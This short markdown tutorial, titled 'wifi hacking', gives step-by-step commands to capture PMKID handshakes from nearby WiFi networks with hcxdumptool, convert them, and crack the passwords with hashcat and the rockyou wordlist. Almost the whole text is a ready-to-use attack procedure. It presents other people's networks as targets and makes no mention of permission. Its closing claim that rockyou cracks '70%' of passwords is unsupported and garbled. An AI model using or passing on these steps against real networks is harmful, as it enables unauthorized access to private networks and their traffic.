# wifi hacking using Hashcat and hcxdumptool 

## Capture PMKID Handshake:

### Use hcxdumptool to capture PMKID handshakes from nearby WiFi networks:

        hcxdumptool -i <interface> -o <output_file>
        
Replace <interface> with your wireless interface (e.g., wlan0) and <output_file> with the filename to save the captured handshakes.

### Convert Captured Handshake:

        hcxpcaptool -z <output_hash_file> <output_file>

Replace <output_hash_file> with the filename for the converted hash file and <output_file> with the filename of the previously saved output file from hcxdumptool.

### Crack Passwords : 

        hashcat -m 16800 <output_hash_file> <wordlist>

Replace <wordlist> with rockyou.txt 

rockyou is dictonary file there is 70% of password hack

dictionary present wordlist in kali linux # rockyou
